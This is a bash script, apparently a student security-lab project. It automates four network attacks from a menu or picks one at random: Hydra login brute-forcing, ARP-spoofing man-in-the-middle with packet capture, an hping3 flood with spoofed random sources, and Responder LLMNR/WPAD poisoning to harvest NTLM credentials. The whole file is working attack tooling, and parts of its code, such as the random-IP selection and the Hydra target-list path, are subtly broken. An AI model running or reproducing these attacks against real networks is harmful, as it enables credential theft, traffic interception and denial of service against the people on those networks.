#!/bin/bash


function hydratck() #1st attack option. 
{	
	echo "Hydra"
	echo "Input Username" #let user decide the username to use for bruteforce.
	read username
	echo "Input Password" #let user decide the password to use for bruteforce.
	read pass
	echo "Input Service" #let user decide which service they want to use for bruteforce.
	read -p "Which service you prefer?" svc 
	echo "A.Manual input IP B.Random for found IPs" #this allow user to decide whether they want manually input IP from found IP lists or randomized it.
	read option
		case $option in
		A|a)
			echo "Selected A"
			echo "Please input IP Address" #let user decide the IP address they want to use for bruteforce.
			read ipa
			hydra -l $username -p $pass $ipa $svc -vV > /var/log/hydra.log
		;;
		B|b)
			echo "Selected B"
			echo "Random choose found IPs"
			rdipa >> /home/kali/Desktop/SOC/listips.txt #rdipa is from another function, any IP scanned by arp -a will be stored into listips.txt for randmized IP usage.
			hydra -l $username -p $pass -M listips.txt $svc -vV > /var/log/hydra.log
		esac	
}

function arpspooff() #2nd attack option
{
	echo "Arp Spoof"
	sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward' #echo 1 to enable to ip forwarding while 0 mean disable.
	
	toa="Is an ARP Spoofing Attack"
	arp -a
	echo "Input Target IP address" 
	read ipc
	echo "Input Gateway IP address"
	read ipd
	sudo arpspoof -i eth0 -t $ipc $ipd & #let Target know that you are Default Gateway
	sudo arpspoof -i eth0 -t $ipd $ipc &	#let Default Gateway know that you are Target
	sudo tcpdump -i eth0  > /var/log/arpsf.log #tcpdump is to capture the packets while -i eth0 is to specific the interface. Similar to the method used for hping3.
	echo "$toa" >> /var/log/arpsf.log #to append what type of attack being used for this particular attack inside the log.
}

function hpingg() #3rd attack option
{
	echo "Hping3"		
	toa="Is an Hping 3 Flood Attack"
	echo "Please input target IP Address"
	read ipa
	sudo hping3 -1 -S -V $ipa --flood --rand-source --fast & # -1 is for only ICMP mode only, -S is SYN Flag only, -V is verbose, perform a flood attack with different random source IP to cover up real IP address, --fast is to send SYN packets faster.
	sudo tcpdump -i eth0 > /var/log/hp3.log #tcpdump is to capture the packets while -i eth0 is specified the interface.
	echo "$toa" >> /var/log/hp3.log #to append what type of attack being used for this particular attack inside the log.
}

function LLMNR() #4th attack option
{
	echo "LLMNR"
	echo "This is Link-Local Multicast Name Resolution aka LLMNR"
	toa="Is a LLMNR Attack"
	sudo responder -I eth0 -wdF -b # sudo responder is a default command for running LLMNR, -I to specific the interface, -w is to start WPAD proxy server, -d to enable answer for DHCP server request and also inject a WPAD server for DCHP response, -F is to force for NTLM(NT Lan Manager)authentification which addin -b to switch to basic Http authentification.
	file=$(cp /usr/share/responder/logs/Responder-Session.log /var/log/llmnr.log) #this is where log for LLMNR stored and copy it to /var/log.
	sudo echo "$toa" >> /var/log/llmnr.log #to append what type of attack being used for this particular attack inside the log.
	#echo "Output saved to /var/log/llmnr.log" #let user know where the log has been saved.
	#echo "$toa" >> /var/log/llmnr.log
	#echo "Output saved to /var/log/llmnr.log"
}

function rdattacks() #random attack which user allow the attack to be randomized instead of chosing a specific attack.
{
	rattacks=$((1 + $RANDOM % 4)) #i put % 4 as there is only 4 attacks.
	case $rattacks in
		1)
			hydratck
		;;
		2)
			arpspooff
		;;
		3)
			hpingg
		;;
		4)
			LLMNR
	esac		
}

#~ function rdips() #to allow randomized of found IP address within the network with the exclusion of certain IP.
#~ {
	#~ ipa=$(arp -a | awk '{print $2}' | tr -d "()" | grep -vx '192.168.152.1\|192.168.152.254')
	
	#~ for ips in $ipa
	#~ do
		#~ rdip=${ips[$RANDOM % 4]}
		#~ echo "$rdip"
	#~ done
#~ }

function rdipa() #to allow randomized of found IP address within the network with the exclusion of certain IP.
{
	ipa=$(arp -a | awk '{print $2}' | tr -d "()" | grep -vx '192.168.152.1\|192.168.152.2\|192.168.152.254')
	
	for ips in $ipa
	do
		rdfip=${ips[$RANDOM % 5]}
		echo "$rdfip"
	done
}

echo "Select preferred attack method"
echo "A.Hydra B.Arpspoof C.Hping3 D.LLMNR E.Random"
read choice

	if [ $choice != "A" -a $choice != "a" -a $choice != "B" -a $choice != "b" -a $choice != "C" -a $choice != "c" -a $choice != "D" -a $choice != "d" -a $choice != "E" -a $choice != "e" ] #if choices doesn't meet either one of the specific keyword,then will exit script.
	then
		echo "Not A Valid Option"
	else	
		case $choice in
	
			A|a)
				echo "Chosed Hydra"
				echo "Hydra is a parallelized login cracker which supports numerous protocols to attack. Its parallelization significantly reduces the time required to crack a password or even username." #description of the attack.
				hydratck 
				echo "Result saved to /var/log/hydra.log" #let user know where the log has been saved.
			
			;;
			B|b)
				echo "Chosed Arpspoof"
				echo "Arpspoof also known as ARP Poisoning or Man in the Middle (MiTM). It refer to an attack where a hacker impersonate the MAC address of another device on a local network and thus allow hacker to intercept & acquired important information." #description of the attack.
				arpspooff 
				echo "Result saved to /var/log/arpsf.log" #let user know where the log has been saved.
		
			;;
			C|c)
				echo "Chosed Hping3"
				echo "Hping3 is a network tools that able to send custom TCP/UDP/ICMP packets to display target replies like ping. Hping3 can also be used to flood a particular devices and cause Denial of Service(DoS) for the targe device." #description of the attack.
				hpingg 
				echo "Result saved to /var/log/hp3.log" #let user know where the log has been saved.
			
			;;
			D|d)
				echo "Chosed LLMNR"
				echo "Link-Local Multicast Name Resolution (LLMNR) is a protocol that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local network without requiring a DNS server or DNS configuration." #description of the attack.
				LLMNR 
				echo "Result saved to /var/log/llmnr.log" #let user know where the log has been saved.
			;;
			E|e)
				echo "Chosed Random"
				rdattacks
		esac
	exit
	fi	
		

